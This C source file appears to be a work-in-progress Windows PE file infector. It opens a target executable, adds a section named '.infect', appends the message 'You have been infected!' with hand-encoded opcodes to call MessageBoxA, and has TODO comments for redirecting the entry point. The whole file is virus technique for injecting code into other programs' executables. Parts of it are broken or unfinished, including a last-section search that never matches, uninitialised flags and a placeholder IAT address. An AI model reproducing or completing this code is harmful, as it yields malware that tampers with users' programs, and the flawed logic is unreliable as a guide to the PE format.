#include "main.h"

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Missing argument.\n");
		printf("Usage: section path\\to\\PE\\executable (Windows)\n");
		exit(1);
	}

	// argv[1] = Path to executable
	FILE *fr = fopen(argv[1], "r+b");
	FILE *fa = fopen(argv[1], "ab");
	FILE *f[2] = { fr, fa };

	IMAGE_DOS_HEADER imageDosHeader;
	IMAGE_FILE_HEADER imageFileHeader;
	IMAGE_OPTIONAL_HEADER imageOptionalHeader;

	// Verify magic byte (0x4D 0x5A == "MZ")
	imageDosHeader.e_magic = getval(fr, dw, SEEK_SET,0);
	if (imageDosHeader.e_magic != 0x5a4d) {
		printf("Input error. File is not a PE executable.");
		end(f, 1);
	}

	imageDosHeader.e_lfanew = getval(fr, dd, SEEK_SET, 0x3C);

	imageFileHeader.NumberOfSections =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew+6);
	setval_int(fr,imageFileHeader.NumberOfSections+1,
		dw,SEEK_SET,imageDosHeader.e_lfanew+6);

	imageFileHeader.SizeOfOptionalHeader =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);

	DWORD ioh_offset = imageDosHeader.e_lfanew + 24;

	// 0x10B => 32-bit
	// 0x20B => 64-bit
	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);

	// TO-DO: Change entry point
	imageOptionalHeader.AddressOfEntryPoint =
		getval(fr, dd, SEEK_SET, ioh_offset+16);
	if (imageOptionalHeader.Magic == 0x10B)
		imageOptionalHeader.ImageBase =
		   getval(fr,dd, SEEK_SET, ioh_offset+28);
	else
		imageOptionalHeader.ImageBase =
		   getval(fr,8, SEEK_SET, ioh_offset+24);
	imageOptionalHeader.SectionAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+32);
	imageOptionalHeader.FileAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+36);
	// TO-DO: Increase SizeOfImage
	imageOptionalHeader.SizeOfImage =
		getval(fr, dd, SEEK_SET,ioh_offset + 56);

	// Import Table
	imageOptionalHeader.DataDirectory[1].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 104 : 120));
	imageOptionalHeader.DataDirectory[1].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 108 : 124));

	// Import Address Table (IAT)
	imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 192 : 208));
	imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));

	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
		// + 40 * (imageFileHeader.NumberOfSections-1);
	IMAGE_SECTION_HEADER lastish;
	lastish.PointerToRawData = 0;
	DWORD lastish_offset = 0;
	// File offset for Import Table and RVA of the containing section
	DWORD import_offset, import_section_rva = 0;
	// File offset for IAT and RVA of the containing section
	DWORD iat_offset, iat_section_rva = 0;
	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
		DWORD current_rva = getval(fr, dd, SEEK_SET,
			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
		DWORD current_offset = getval(fr,dd, SEEK_SET,
			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 20);

		// Find file offset of Import Table
		if (current_rva > import_section_rva && current_rva <= imageOptionalHeader.DataDirectory[1].VirtualAddress) {
			import_section_rva = current_rva;
			import_offset = imageOptionalHeader.DataDirectory[1].VirtualAddress - current_rva + current_offset;
				// = imageOptionalHeader.DataDirectory[1].VirtualAddress - import_section_rva + current_offset;
		}
		if (current_rva > iat_section_rva && current_rva <= imageOptionalHeader.DataDirectory[12].VirtualAddress) {
			iat_section_rva = current_rva;
			iat_offset = imageOptionalHeader.DataDirectory[12].VirtualAddress - current_rva + current_offset;
				// = imageOptionalHeader.DataDirectory[12].VirtualAddress - iat_section_rva + current_offset;
		}

		// Find PointerToRawData of the last section
		// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
		if (current_offset < lastish.PointerToRawData) {
			lastish.PointerToRawData = current_offset;
			lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i;
		}
	}

	IMAGE_IMPORT_DESCRIPTOR user32dll_iid;
	int user32dll_exist, function_exist = 0;
	// Search for user32.dll
	for (int i = 0; ; ++i) {
		DWORD name_rva = getval(fr, dd, SEEK_SET,import_offset + 20 * i + 12);
		if (name_rva == 0) break; // No user32.dll
		BYTE name[MAX_PATH];

		// Read name of import, byte by byte
		fseek(fr, name_rva - imageOptionalHeader.DataDirectory[1].VirtualAddress + import_offset, SEEK_SET);
		for (int j = 0; j < MAX_PATH ; ++j) {
			fread(name+j, 1, 1, fr);
			if (name[j] == 0) break;
		}

		if (strcmp(name,"user32.dll")==0) {
			user32dll_exist = 1;

			user32dll_iid.OriginalFirstThunk = getval(fr, dd, SEEK_SET, import_offset + 20 * i);
			user32dll_iid.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.Name = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.FirstThunk = getval(fr, dd, SEEK_CUR, 0);

			// Ignore functions imported using ordinals
			IMAGE_THUNK_DATA thunk;
			for (int j = 0 ;; j++) {
				thunk.u1.AddressOfData =
					getval(fr, imageOptionalHeader.Magic == 0x10B ? dd : dq, SEEK_SET,
				   user32dll_iid.OriginalFirstThunk - iat_section_rva + iat_offset +
				   (imageOptionalHeader.Magic == 0x10B ? 4 : 8) * j);
				if (thunk.u1.AddressOfData == 0) break; // No MessageBoxA

				BYTE function[MAX_PATH];
				// Not accounting for Hint/Names table being in a different section
				fseek(fr, user32dll_iid.Name - import_section_rva + import_offset, SEEK_SET);
				// Read function name, byte by byte
				for (int k = 0; k < MAX_PATH; k++) {
					fread(function+k, 1, 1, fr);
					if (function[k] == 0) break;
				}
				if (strcmp(function,"MessageBoxA")==0) {
					function_exist = 1;
				}

			}
			break;
		}
	}

	if (user32dll_exist == 0) {

	} else if (function_exist ==0) {

	}

	lastish.VirtualAddress =
		getval(fr, dd, SEEK_SET, lastish_offset + 12);
	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_offset + 16);

	DWORD newish_offset = lastish_offset + 40;
	IMAGE_SECTION_HEADER newish = {
		// Name
		".infect",
		// Misc.VirtualSize
		0, // Edit to reflect actual size
		// VirtualAddress
		closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
		// SizeOfRawData
		closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment),
		// PointerToRawData
		0, // Edit
		// PointerToRelocations
		0,
		// PointerToLinenumbers
		0,
		// NumberOfRelocations
		0,
		// NumberOfLinenumbers
		0,
		// Characteristics
		0x60000060,
			// IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
			// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
	};

	// Adding new section
	fseek(fr, 0, SEEK_END);
	const long old_end = ftell(fr);
	newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
	const char *msgCaption = "Notice";
	const char *msgText = "You have been infected!";

	pad(fa, newish.PointerToRawData - old_end);
	// Should be written at newsh_addr
	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
	// Should be written at newsh_addr + strlen(msgCaption) + 1
	fwrite(msgText, strlen(msgText)+1, 1, fa);
	instruct(fa, 0x68, 0x1030);
	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newish.PointerToRawData);
	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.PointerToRawData + strlen(msgCaption) + 1);
	instruct(fa, 0x6a, 0);
	instruct(fa, 0xFF25, imageOptionalHeader.ImageBase + 0);
	// ImageBase + IAT RVA of MessageBoxA

	// Call MessageBoxA

	// Jmp back to old AddressOfEntryPoint

	// // Edit SizeOfImage
	// imageOptionalHeader.SizeOfImage =
	// 	closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData, ;

	// Write to Section Header
	setval_char(fr, newish.Name,8, SEEK_SET, newish_offset);
	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
	setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
	setval_int(fr,newish.PointerToRelocations, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
	setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);



	end(f, 0);
}
